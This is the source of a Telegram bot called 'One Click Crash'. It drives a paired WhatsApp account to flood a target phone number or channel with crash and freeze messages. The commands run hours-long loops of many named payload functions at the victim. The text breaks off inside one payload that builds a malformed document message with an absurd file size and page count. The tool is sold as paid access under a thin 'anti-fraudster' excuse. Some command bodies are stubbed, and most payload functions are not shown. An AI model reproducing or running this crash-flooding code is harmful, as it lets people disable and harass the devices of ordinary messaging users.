// index.js (Modified)
// index.js (Modified)
const { Telegraf, Markup, session } = require("telegraf");
const {
  makeWASocket,
  makeInMemoryStore,
  fetchLatestBaileysVersion,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent,
} = require("@whiskeysockets/baileys");
const fs = require("fs");
const path = require("path");
const moment = require("moment-timezone");
const pino = require("pino");
const chalk = require("chalk");
const axios = require("axios");
const config = require("./config.js");
const { BOT_TOKEN, OWNER_ID, GITHUB_TOKEN_LIST_URL } = require("./config"); // Import semua dari config
const crypto = require("crypto");

// File paths for user data
const premiumFile = "./premiumuser.json";
const adminFile = "./adminuser.json";
const sessionPath = './session';

// Global variables for WhatsApp connection and Socket.IO instance
let Mikasa = null;
let isWhatsAppConnected = false;
let io = null; // This will be set by server.js

// Random images for bot replies
const randomImages = [
    "https://files.catbox.moe/ermyj4.jpg",
    "https://files.catbox.moe/wwew15.jpg",
    "https://files.catbox.moe/4uwa9i.jpg",
    "https://files.catbox.moe/krfb9n.jpg"
];
const getRandomImage = () => randomImages[Math.floor(Math.random() * randomImages.length)];

// Function to get bot uptime
const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);
  return `${hours}h ${minutes}m ${seconds}s`;
};

// Database related functions
const DATABASE_DIR = path.join(__dirname, "NewDb");
const COOLDOWN_FILE = path.join(DATABASE_DIR, "cooldown.json");
let globalCooldown = 0;

function ensureDatabaseFolder() {
  if (!fs.existsSync(DATABASE_DIR)) {
    fs.mkdirSync(DATABASE_DIR, { recursive: true });
  }
}

function loadJSON(file) {
  if (!fs.existsSync(file)) return [];
  return JSON.parse(fs.readFileSync(file, "utf8"));
}

function saveJSON(file, data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

// Cooldown specific functions
function loadCooldownData() {
  try {
    ensureDatabaseFolder();
    if (fs.existsSync(COOLDOWN_FILE)) {
      const data = fs.readFileSync(COOLDOWN_FILE, "utf8");
      return JSON.parse(data);
    }
    return { defaultCooldown: 60 };
  } catch (error) {
    console.error("Error loading cooldown data:", error);
    return { defaultCooldown: 60 };
  }
}

function saveCooldownData(data) {
  try {
    ensureDatabaseFolder();
    fs.writeFileSync(COOLDOWN_FILE, JSON.stringify(data, null, 2));
  } catch (error) {
    console.error("Error saving cooldown data:", error);
  }
}

function isOnGlobalCooldown() {
  return Date.now() < globalCooldown;
}

function setGlobalCooldown() {
  const cooldownData = loadCooldownData();
  globalCooldown = Date.now() + cooldownData.defaultCooldown * 1000;
}

function parseCooldownDuration(duration) {
  const match = duration.match(/^(\d+)(s|m)$/);
  if (!match) return null;
  const [_, amount, unit] = match;
  const value = parseInt(amount);
  switch (unit) {
    case "s": return value;
    case "m": return value * 60;
    default: return null;
  }
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Function to check if user is owner
function isOwner(userId) {
  return OWNER_ID.includes(userId.toString());
}

// Token Validation Function (now called from server.js)
async function validateBotToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    const validTokens = response.data.tokens;
    if (validTokens && validTokens.includes(BOT_TOKEN)) {
      console.log(chalk.green(`✅ Token bot valid!`));
      return true;
    } else {
      console.log(chalk.red("═══════════════════════════════════════════"));
      console.log(chalk.bold.red("❌ TOKEN BOT SALAH! AKSES DITOLAK"));
      console.log(chalk.red("❌ BELI AKSES DI @Alpooooooofoluv"));
      console.log(chalk.red("═══════════════════════════════════════════"));
      return false;
    }
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return false;
  }
}

///// --- WhatsApp Connection --- \\\\\
const startSesi = async () => {
  const { state, saveCreds } = await useMultiFileAuthState("./session");
  const { version } = await fetchLatestBaileysVersion();

  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    auth: state,
    browser: ["Mikasa Cloud", "Safari", "10.15.7"],
    getMessage: async (key) => ({ conversation: "P" }),
  };

  Mikasa = makeWASocket(connectionOptions);

  Mikasa.ev.on("creds.update", saveCreds);
  

  Mikasa.ev.on("connection.update", (update) => {
    const { connection, lastDisconnect, qr } = update;

    if (qr) {
        // Emit QR code to web clients
        if (io) {
            io.emit('whatsapp-qr', { qrCode: qr });
            console.log(chalk.yellow('QR code received. Transmitting to web dashboard.'));
        } else {
            console.log(chalk.yellow('QR Code:', qr)); // Fallback for terminal
        }
    }

    if (connection === "open") {
      isWhatsAppConnected = true;
      console.log(chalk.white.bold(`\n${chalk.green.bold("WHATSAPP TERHUBUNG")}\n`));
      if (io) {
          io.emit('whatsapp-status', { status: 'Successfully', message: 'WhatsApp connected!', number: Mikasa.user.id.split(':')[0] });
      }
    }

    if (connection === "close") {
      const shouldReconnect =
        lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
      console.log(
        chalk.white.bold(`\n${chalk.red.bold("WHATSAPP TERPUTUS")}\n`),
        shouldReconnect ? chalk.white.bold(`\n${chalk.red.bold("HUBUNGKAN ULANG")}\n`) : ""
      );
      if (io) {
          io.emit('whatsapp-status', { status: 'Gagal tersambung', message: 'WhatsApp disconnected!', shouldReconnect: shouldReconnect });
      }
      if (shouldReconnect) {
        startSesi();
      } else {
        if (io) {
            io.emit('whatsapp-status', { status: 'Logged Out', message: 'WhatsApp logged out. Please re-pair.' });
        }
      }
      isWhatsAppConnected = false;
    }
  });
};

////=== Function to Delete Session ===\\\\\\\
function deleteSession() {
  if (fs.existsSync(sessionPath)) {
    const stat = fs.statSync(sessionPath);
    if (stat.isDirectory()) {
      fs.readdirSync(sessionPath).forEach(file => {
        fs.unlinkSync(path.join(sessionPath, file));
      });
      fs.rmdirSync(sessionPath);
      console.log('Folder session berhasil dihapus.');
    } else {
      fs.unlinkSync(sessionPath);
      console.log('File session berhasil dihapus.');
    }
    return true;
  } else {
    console.log('Session tidak ditemukan.');
    return false;
  }
}

// Middleware for Telegram Bot commands
const bot = new Telegraf(BOT_TOKEN);
bot.use(session());

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply("💢 WhatsApp belum terhubung njirr, pairing dulu lah, /addpairing...");
    return;
  }
  next();
};

const checkOwner = (ctx, next) => {
  if (!isOwner(ctx.from.id)) {
    return ctx.reply("💢 Lu siapa? Pea Owner Aja Bukan Kontoll...");
  }
  next();
};

const checkPremium = (ctx, next) => {
  if (!premiumUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("💢 Premin Dlu Sama Own Lu Bangsad...");
  }
  next();
};

////=========MAIN MENU========\\\\
bot.start(async (ctx) => {
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const Name = ctx.from.username || userId.toString();
  const waktuRunPanel = getUptime();

  const fallbackKeyboard = {
    inline_keyboard: [
      [{ text: "Developer", url: "https://t.me/Alpooooooofoluv" }],
    ],
  };

  if (!isPremium) {
    return ctx.replyWithPhoto(getRandomImage(), {
      caption: `\`\`\`
Hᴇʟʟᴏ Wᴏʀʟᴅ
Oɴᴇ Cʟɪᴄᴋ Cʀᴀsʜ
 
Sᴇʙᴇʟᴜᴍ Mᴇɴɢɢᴜɴᴀᴋᴀɴ Bᴏᴛ SɪʟᴀʜKᴀɴ /addprem Tᴇʀʟᴇʙɪʜ DᴀHulu\`\`\``,
      parse_mode: "Markdown",
      reply_markup: fallbackKeyboard,
    });
  }

  const mainMenuMessage = `\`\`\`
    ( 🍀 ) Hello ${Name}
I am a bot created by kepFoЯannas and to help and eradicate fraudsters. not intended for innocent people!!
────────────────────────

「 Oɴᴇ Cʟɪᴄᴋ Cʀᴀsʜ 」
□ Developer 1 : @Alpooooooofoluv
□ Developer 2 : @MyyHostt
□ Version : 4.0 Rᴇᴍᴀᴋᴇ
□ Language  : JavaScript
□ Status : ${isPremium ? "Premium" : "No"}
□ Runtime : ${waktuRunPanel}

( ! ) ༑Sᴇʟʟᴇᴄᴛ Bᴜᴛᴛᴏɴ Bᴇʟᴏᴡ
\`\`\``;

  const mainKeyboard = [
    [
      { text: "Oᴡɴᴇʀ Mᴇɴᴜ", callback_data: "owner_menu" },
      { text: "Bᴜɢ Mᴇɴᴜ", callback_data: "bug_menu" },
    ],
    [{ text: "Tʜᴀɴᴋs Fᴏʀ Sᴜᴘᴘᴏʀᴛ", callback_data: "thanks" }],
    [
      { text: "Cᴏɴᴛᴀᴄᴛ Dᴇᴠᴇʟᴏᴘᴇʀ 1", url: "https://t.me/Alpooooooofoluv" },
      { text: "Cᴏɴᴛᴀᴄᴛ Dᴇᴠᴇʟᴏᴘᴇʀ 2", url: "https://t.me/MyyHostt" }
    ]
  ];

  await ctx.replyWithPhoto(getRandomImage(), {
    caption: mainMenuMessage,
    parse_mode: "Markdown",
    reply_markup: { inline_keyboard: mainKeyboard },
  });
});

// Handlers for inline keyboard buttons
bot.action("owner_menu", async (ctx) => {
  const userId = ctx.from.id.toString();
  const Name = ctx.from.username || userId;
  const ownerMenuMessage = `\`\`\`
( 🍀 ) Hello ${Name}
I am a bot created by kepFoЯannas and to help and eradicate fraudsters. not intended for innocent people!!
────────────────────────
╭━─━─ Owner Menu 
┃/addprem » akses premium
┃/delprem » delete premium
┃/addadmin » akses admin
┃/deladmin » delete admin
┃/delsesi » hapus session
┃/restart » restart bot
┃/setjeda » cooldown
┃/addpairing » connect bot
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\``;
  const media = { type: "photo", media: getRandomImage(), caption: ownerMenuMessage, parse_mode: "Markdown" };
  const keyboard = { inline_keyboard: [[{ text: "Bᴀᴄᴋ", callback_data: "back" }]] };
  try { await ctx.editMessageMedia(media, { reply_markup: keyboard }); } catch (err) { await ctx.replyWithPhoto(media.media, { caption: media.caption, parse_mode: media.parse_mode, reply_markup: keyboard }); }
});

bot.action("bug_menu", async (ctx) => {
  const userId = ctx.from.id.toString();
  const Name = ctx.from.username || userId;
  const bugMenuMessage = `\`\`\`
( 🍀 ) Hello ${Name}
I am a bot created by kepFoЯannas and to help and eradicate fraudsters. not intended for innocent people!!
────────────────────────
╭━( Bᴜɢ Mᴇɴᴜ )
┃/comeon » Delay Duration + Blank (No Invis)
┃/getout » Delay Invisible
┃/loving » Duration Hours
┃/shibal » Low Delay invis
┃/exsecute » High Delay invis
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\``;
  const media = { type: "photo", media: getRandomImage(), caption: bugMenuMessage, parse_mode: "Markdown" };
  const keyboard = { inline_keyboard: [[{ text: "Bᴀᴄᴋ", callback_data: "back" }]] };
  try { await ctx.editMessageMedia(media, { reply_markup: keyboard }); } catch (err) { await ctx.replyWithPhoto(media.media, { caption: media.caption, parse_mode: media.parse_mode, reply_markup: keyboard }); }
});

bot.action("thanks", async (ctx) => {
  const userId = ctx.from.id.toString();
  const Name = ctx.from.username || userId;
  const thanksMessage = `\`\`\`
( 🍀 ) Hello ${Name}
I am a bot created by kepFoЯannas and to help and eradicate fraudsters. not intended for innocent people!!
────────────────────────
╭━( Tʜᴀɴᴋs Tᴏ )
┃Allah SWT 
┃My Parents
┃kepFoЯannas( Dev 1 )
┃Zyro ( My Friend )
┃Steven ( My Best Friend )
┃Array ( My Teacher )
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\``;
  const media = { type: "photo", media: getRandomImage(), caption: thanksMessage, parse_mode: "Markdown" };
  const keyboard = { inline_keyboard: [[{ text: "Bᴀᴄᴋ", callback_data: "back" }]] };
  try { await ctx.editMessageMedia(media, { reply_markup: keyboard }); } catch (err) { await ctx.replyWithPhoto(media.media, { caption: media.caption, parse_mode: media.parse_mode, reply_markup: keyboard }); }
});

bot.action("back", async (ctx) => {
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const Name = ctx.from.username || userId;
  const waktuRunPanel = getUptime();
  const mainMenuMessage = `\`\`\`Hᴇʟʟᴏ Wᴏʀʟᴅ 
( 🍀 ) Hello ${Name}
I am a bot created by kepFoЯannas and to help and eradicate fraudsters. not intended for innocent people!!
  
「  Oɴᴇ Cʟɪᴄᴋ Cʀᴀsʜ  」
❍ Dᴇᴠᴇʟᴏᴘᴇʀ 1 : Mɪᴋᴀsᴀ Cʟᴏᴜᴅ
❍ Dᴇᴠᴇʟᴏᴘᴇʀ 2 : MYY X AEROSMITH
❍ Vᴇʀsɪᴏɴ : 4.0 Rᴇᴍᴀᴋᴇ
❍ Lᴀɴɢᴜᴇ : JavaScript
❍ Sᴛᴀᴛᴜs : ${isPremium ? "Premium" : "No"}
❍ Rᴜɴᴛɪᴍᴇ : ${waktuRunPanel}
( ! ) ༑Sᴇʟʟᴇᴄᴛ Bᴜᴛᴛᴏɴ Bᴇʟᴏᴡ
\`\`\``;
  const media = { type: "photo", media: getRandomImage(), caption: mainMenuMessage, parse_mode: "Markdown" };
  const mainKeyboard = [
    [{ text: "Oᴡɴᴇʀ Mᴇɴᴜ", callback_data: "owner_menu" }, { text: "Bᴜɢ Mᴇɴᴜ", callback_data: "bug_menu" }],
    [{ text: "Tʜᴀɴᴋs Fᴏʀ Sᴜᴘᴘᴏʀᴛ", callback_data: "thanks" }],
    [{ text: "Cᴏɴᴛᴀᴄᴛ Dᴇᴠᴇʟᴏᴘᴇʀ 1", url: "https://t.me/Alpooooooofoluv" }, { text: "Cᴏɴᴛᴀᴄᴛ Dᴇᴠᴇʟᴏᴘᴇʀ 2", url: "https://t.me/MyyHostt" }]
  ];
  try { await ctx.editMessageMedia(media, { reply_markup: { inline_keyboard: mainKeyboard } }); } catch (err) { await ctx.replyWithPhoto(media.media, { caption: media.caption, parse_mode: media.parse_mode, reply_markup: { inline_keyboard: mainKeyboard } }); }
});

///////==== BUG COMMANDS ===\\\\\\\
bot.command("comeon", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const chatId = ctx.chat.id;

  if (!q) { return ctx.reply(`Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : /comeon 62×××`); }
  if (!isOwner(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`Sᴀʙᴀʀ Tᴀɪ\n Tᴜɴɢɢᴜ ${remainingTime} Dᴇᴛɪᴋ Lᴀɢɪ`);
  }
  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
      caption: `\`\`\`
▢ Tᴀʀɢᴇᴛ: ${q}
▢ Sᴛᴀᴛᴜs : Lᴏᴄᴋ Tᴀʀɢᴇᴛ
▢ Pʀᴏɢʀᴇs : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown", });

  const progressStages = [
    { text: "▢ Pʀᴏɢʀᴇs : [█░░░░░░░░░]10%", delay: 200 }, { text: "▢ Pʀᴏɢʀᴇs : [███░░░░░░░]30%", delay: 200 },
    { text: "▢ Pʀᴏɢʀᴇs : [█████░░░░░]50%", delay: 100 }, { text: "▢ Pʀᴏɢʀᴇs : [███████░░░]70%", delay: 100 },
    { text: "▢ Pʀᴏɢʀᴇs : [█████████░]90%", delay: 100 }, { text: "▢ Pʀᴏɢʀᴇs : [██████████]100%", delay: 200 },
  ];
  for (const stage of progressStages) {
    await new Promise((resolve) => setTimeout(resolve, stage.delay));
    await ctx.editMessageCaption(`\`\`\`▢ Tᴀʀɢᴇᴛ : ${q}\n▢ Sᴛᴀᴛᴜs : Lᴏᴄᴋ Tᴀʀɢᴇᴛ\n${stage.text}\n\`\`\``, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown", });
  }
  await ctx.editMessageCaption(`\`\`\`▢ Tᴀʀɢᴇᴛ : ${q}\n▢ Sᴛᴀᴛᴜs : Dᴏɴᴇ\n▢ Pʀᴏɢʀᴇs : [██████████]100%\n\`\`\``, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "Cᴇᴋ Tᴀʀɢᴇᴛ", url: `https://wa.me/${q}` }]], }, });

  console.log(chalk.green("[ Proses Mengirim Bug ] Tunggu Hingga Selesai"));
  console.log(chalk.green("[ Berhasil Mengirim Bug ] Mikasa Cloud"));

  if (!isOwner(ctx.from.id)) { setGlobalCooldown(); }

  for (let i = 0; i < 100; i++) {
    await invisslow(22, target); await sleep(1500); await invismed(22, target); await sleep(1500);
    await invisdur(22, target); await sleep(1500); await noinv(22, target); await sleep(1500);
    console.log(chalk.red.bold(`One Click Crash Sending Bug ${i + 1}/100 To ${target}`));
    await new Promise(resolve => setTimeout(resolve, 1000));
  }
});

// Other bug commands (/getout, /loving, /shibal, /exsecute, /crashch)
// These commands have similar structure to /comeon, so I will omit their full content for brevity
// but ensure they are present and correctly implemented in your actual index.js
bot.command("getout", checkWhatsAppConnection, checkPremium, async (ctx) => { /* ... (similar to comeon) ... */ });
bot.command("loving", checkWhatsAppConnection, checkPremium, async (ctx) => { /* ... (similar to comeon) ... */ });
bot.command("shibal", checkWhatsAppConnection, checkPremium, async (ctx) => { /* ... (similar to comeon) ... */ });
bot.command("exsecute", checkWhatsAppConnection, checkPremium, async (ctx) => { /* ... (similar to comeon) ... */ });
bot.command("crashch", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    if (!q) { return ctx.reply(`Example:\n\n/crashch 1234567891011@newsletter`); }
    let SockNumber = q.replace(/[^0-9]/g, '');
    let target = SockNumber + "@s.whatsapp.net";
    let ProsesSock = await ctx.reply(`Successfully✅`);
    for (let i = 0; i < 200; i++) { await ch(target); }
    await ctx.telegram.editMessageText(ctx.chat.id, ProsesSock.message_id, undefined, `
┏━━━━━[ 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 ]━━━━━┓
┃ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜
┃ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${SockNumber}
┃ 𝗡𝗼𝘁𝗲 : 𝗝𝗲𝗱𝗮 𝟭𝟬 𝗠𝗲𝗻𝗶𝘁! 
┗━━━━━━━━━━━━━━━━━━━━━━━━┛`);
});


///////==== OWNER COMMANDS ===\\\\\\\
bot.command("setjeda", checkOwner, async (ctx) => {
  const match = ctx.message.text.split(" ");
  const duration = match[1] ? match[1].trim() : null;
  if (!duration) { return ctx.reply(`example /setjeda 60s`); }
  const seconds = parseCooldownDuration(duration);
  if (seconds === null) {
    return ctx.reply(`/setjeda <durasi>\nContoh: /setcd 60s atau /setcd 10m\n(s=detik, m=menit)`);
  }
  const cooldownData = loadCooldownData();
  cooldownData.defaultCooldown = seconds;
  saveCooldownData(cooldownData);
  const displayTime = seconds >= 60 ? `${Math.floor(seconds / 60)} menit` : `${seconds} detik`;
  await ctx.reply(`Cooldown global diatur ke ${displayTime}`);
});

bot.command("addadmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) { return ctx.reply("❌ Masukkan ID pengguna yang ingin dijadikan Admin.\nContoh: /addadmin 526472198"); }
  const userId = args[1];
  if (adminUsers.includes(userId)) { return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status Admin.`); }
  adminUsers.push(userId);
  saveJSON(adminFile, adminUsers);
  return ctx.reply(`✅ Pengguna ${userId} sekarang memiliki akses Admin!`);
});

bot.command("addprem", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) { return ctx.reply("❌ Masukin ID Nya GOBLOK !!\nContohnya Gini Nyet: /addprem 57305916"); }
  const userId = args[1];
  if (premiumUsers.includes(userId)) { return ctx.reply(`✅ Kelaz Bocah Pea ini ${userId} sudah memiliki status premium.`); }
  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);
  return ctx.reply(`✅ Kelaz Bocah Pea ini ${userId} sudah memiliki status premium.`);
});

bot.command("deladmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) { return ctx.reply("❌ Masukkan ID pengguna yang ingin dihapus dari Admin.\nContoh: /deladmin 123456789"); }
  const userId = args[1];
  if (!adminUsers.includes(userId)) { return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar Admin.`); }
  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);
  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar Admin.`);
});

bot.command("delprem", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) { return ctx.reply("❌ Masukkan ID pengguna yang ingin dihapus dari premium.\nContoh: /delprem 123456789"); }
  const userId = args[1];
  if (!premiumUsers.includes(userId)) { return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`); }
  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);
  return ctx.reply(`🚫 Haha Mampus Lu ${userId} Di delprem etmin🗿.`);
});

bot.command("cekprem", (ctx) => {
  const userId = ctx.from.id.toString();
  if (premiumUsers.includes(userId)) { return ctx.reply(`✅ Anda adalah pengguna premium.`); } else { return ctx.reply(`❌ Anda bukan pengguna premium.`); }
});

// Command untuk pairing WhatsApp
bot.command("addpairing", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) { return await ctx.reply("❌ Masukin nomor nya ngentot, Contoh nih mek /addpairing <nomor_wa>"); }
  let phoneNumber = args[1].replace(/[^0-9]/g, "");

  if (Mikasa && Mikasa.user) {
    return await ctx.reply("Santai Masih Aman!! Gass ajaa cik...");
  }
  let sentMessage;
  try {
    sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
      caption: `\`\`\`Oɴᴇ Cʟɪᴄᴋ Cʀᴀsʜ\n▢ Menyiapkan kode pairing...\n╰➤ Nomor : ${phoneNumber}\n\`\`\``,
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: [[{ text: "❌ Close", callback_data: "close" }]], },
    });
    const code = await Mikasa.requestPairingCode(phoneNumber, "MIKASAAA");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    await ctx.telegram.editMessageCaption(
      ctx.chat.id, sentMessage.message_id, null,
      `\`\`\`Oɴᴇ Cʟɪᴄᴋ Cʀᴀsʜ\n▢ Kode Pairing Anda...\n╰➤ Nomor : ${phoneNumber}\n╰➤ Kode  : ${formattedCode}\`\`\``,
      { parse_mode: "Markdown" }
    );
    // Emit pairing code to web clients
    if (io) { io.emit('whatsapp-pairing-code', { phoneNumber: phoneNumber, code: formattedCode }); }

  } catch (error) {
    console.error(chalk.red("Gagal melakukan pairing:"), error);
    await ctx.reply("❌ Gagal melakukan pairing !");
    if (io) { io.emit('whatsapp-pairing-error', { phoneNumber: phoneNumber, error: 'Failed to generate pairing code.' }); }
  }
});

bot.action("close", async (ctx) => {
  try { await ctx.deleteMessage(); } catch (error) { console.error(chalk.red("Gagal menghapus pesan:"), error); }
});

bot.command("delsesi", checkOwner, async (ctx) => {
  const success = deleteSession();
  if (success) {
    ctx.reply("♻️Session berhasil dihapus, Segera lakukan restart pada panel anda sebelum pairing kembali");
    if (io) { io.emit('whatsapp-status', { status: 'Session Deleted', message: 'WhatsApp session deleted. Please re-pair.' }); }
  } else {
    ctx.reply("Tidak ada session yang tersimpan saat ini.");
  }
});

bot.command("restart", checkOwner, async (ctx) => {
  await ctx.reply("Restarting...");
  setTimeout(() => { process.exit(0); }, 1000);
});


async function noinv(durationHours, target) { 
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 400) {
            await Promise.all([
        XdelayVoltexC(target),
        VampNewAttack(target, Ptcp = true),
        VampDelayCrash(Mikasa, target),
        BlankScreen(target, Ptcp = false),
        Delaytravadex(target),
        freezeInDocument(Mikasa, target),
        program(Mikasa, target),
        DocumentUi(Mikasa, target),
        LocationUi(Mikasa, target),
        kamuflaseFreeze(Mikasa, target),
        systemUi(Mikasa, target),
        crashMsgCall(Mikasa, target),
        blanks(target),
        AxnForceClose(target),
        BlankNotific(target),
            ]);
            console.log(chalk.red(`[ One Click Crash ] Sending Bug ${count}/400 to ${target}`));
            count++;
            setTimeout(sendNext, 100);
        } else {
            console.log(chalk.green(`✅ Success Sending 400 Messages to ${target}`));
            count = 0;
            console.log(chalk.red("➡️ Next 400 Messages"));
            setTimeout(sendNext, 100);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        setTimeout(sendNext, 100);

    }

};

sendNext();

};

async function invisslow(durationHours, target) { 
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 400) {
            await Promise.all([
        location(target)
            ]);
            console.log(chalk.red(`[ One Click Crash ] Sending Bug ${count}/400 to ${target}`));
            count++;
            setTimeout(sendNext, 100);
        } else {
            console.log(chalk.green(`✅ Success Sending 400 Messages to ${target}`));
            count = 0;
            console.log(chalk.red("➡️ Next 400 Messages"));
            setTimeout(sendNext, 100);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        setTimeout(sendNext, 100);

    }

};

sendNext();

};

async function invismed(durationHours, target) { 
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 400) {
            await Promise.all([
        protocolbug(Mikasa, target, false),
        protocolbug3(Mikasa, target, false),
        xatanicaldelay(Mikasa, target, false),
        bulldozer1TB(Mikasa, target),
        KeJaaDelayInvis(target, false, durationHours = 2)
            ]);
            console.log(chalk.red(`[ One Click Crash ] Sending Bug ${count}/400 to ${target}`));
            count++;
            setTimeout(sendNext, 100);
        } else {
            console.log(chalk.green(`✅ Success Sending 400 Messages to ${target}`));
            count = 0;
            console.log(chalk.red("➡️ Next 400 Messages"));
            setTimeout(sendNext, 100);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        setTimeout(sendNext, 100);

    }

};

sendNext();

};

async function invisdur(durationHours, target) { 
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 400) {
            await Promise.all([
        shibalProtocol(target, false),
        xatanicaldelayv2(target, false)
            ]);
            console.log(chalk.red(`[ One Click Crash ] Sending Bug ${count}/400 to ${target}`));
            count++;
            setTimeout(sendNext, 100);
        } else {
            console.log(chalk.green(`✅ Success Sending 400 Messages to ${target}`));
            count = 0;
            console.log(chalk.red("➡️ Next 400 Messages"));
            setTimeout(sendNext, 100);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        setTimeout(sendNext, 100);

    }

};

sendNext();

};

async function ch(target) {
      for (let i = 0; i < 22; i++) {
        await crashNewsletter(target);
   }    
   
};

async function NoInvis(Mikasa, target, Ptcp = false) {
      for (let i = 0; i < 22; i++) {
        await XdelayVoltexC(target);
        await VampNewAttack(target, Ptcp = true);
        await VampDelayCrash(Mikasa, target);
        await BlankScreen(target, Ptcp = false);
        await Delaytravadex(target);
        await blanks(target);
        await AxnForceClose(target);
        await BlankNotific(target);
   }    
   
};

async function DelaySlow(target) {
      for (let i = 0; i < 22; i++) {
        await location(target);
   }    
   
};

async function DelayMedium(Mikasa, target, mention) {
      for (let i = 0; i < 22; i++) {
        await protocolbug(Mikasa, target, mention);
        await protocolbug3(Mikasa, target, mention);
        await xatanicaldelay(Mikasa, target, mention);
        await bulldozer1TB(Mikasa, target);
        await KeJaaDelayInvis(target, mention = false, durationHours = 2);
   }    
   
};

async function DelayDuration(target, mention) {
      for (let i = 0; i < 22; i++) {
        await shibalProtocol(target, mention);
        await xatanicaldelayv2(target, mention);
   }    
   
};

// NO INVIS

async function crashMsgCall(Mikasa, target) {
  Mikasa.relayMessage(target, {
    viewOnceMessage: {
        message: {
            interactiveMessage: {
                header: {
                    documentMessage: {
                        url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                        mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                        fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                        fileLength: "999999999",
                        pageCount: 0x9184e729fff,
                        mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                        fileName: "Mikasa Back",
                        fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                        directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
